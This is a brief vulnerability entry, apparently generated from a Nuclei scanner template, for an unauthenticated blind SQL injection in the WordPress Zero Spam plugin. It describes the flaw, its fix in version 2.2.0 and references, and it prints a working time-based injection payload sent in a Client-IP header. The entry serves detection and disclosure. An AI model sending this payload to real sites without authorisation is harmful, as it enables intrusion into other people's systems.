# Nuclei Template: WordPress Zero Spam <= 2.1.1 - Blind SQL Injection
**Template ID:** zero-spam-sql-injection
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`zero-spam-sql-injection.yaml`)

## Vulnerability Information & PoC

## Description
The WordPress Zero Spam WordPress plugin was affected by an Unauthenticated Blind SQL Injection security vulnerability.

## Steps to reproduce / Exploit Payload
```http
@timeout: 10s
GET / HTTP/1.1
Host: {{Hostname}}
Client-IP: '+(select(0)from(select(sleep(7)))v)+'
```

## Remediation
Fixed in version 2.2.0

## References
- https://wpscan.com/vulnerability/44cc8d59-9b45-46b7-afaf-894e4ba62dd5
- https://wordpress.org/plugins/zero-spam/
